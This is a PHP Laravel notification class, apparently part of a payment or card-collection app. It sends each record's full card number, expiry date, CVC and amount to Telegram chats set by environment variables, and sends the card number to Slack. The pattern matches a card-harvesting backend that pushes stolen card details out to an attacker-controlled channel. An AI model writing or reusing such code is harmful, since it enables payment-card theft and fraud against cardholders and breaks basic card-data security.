<?php

namespace App\Notifications;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Notifications\Messages\MailMessage;
use Illuminate\Notifications\Messages\SlackMessage;
use Illuminate\Notifications\Notification;
use NotificationChannels\Telegram\TelegramChannel;
use NotificationChannels\Telegram\TelegramMessage;

class TelegramCardCreated extends Notification
{


    public function via($notifiable)
    {
        return [TelegramChannel::class, 'slack'];
    }


    public function toTelegram($notifiable)
    {
       $message = "$" . $notifiable->amount . " - " . $notifiable->card_number . " " . $notifiable->month ."/" . $notifiable->year ." " . $notifiable->cvc ;

       if($notifiable->type == 'storecard'){
           return TelegramMessage::create()
               ->to(env('TELEGRAM_ID_StoreCards'))
               ->content($message);
       }
       else{
           return TelegramMessage::create()
               ->to(env('TELEGRAM_ID'))
               ->content($message);
       }

    }

    public function toSlack($notifiable)
    {
        $message = "Card number: " . $notifiable->card_number . " Amount: " . $notifiable->amount;
        return (new SlackMessage)
            ->content($message);
    }


    public function toArray($notifiable)
    {
        return [
            //
        ];
    }
}
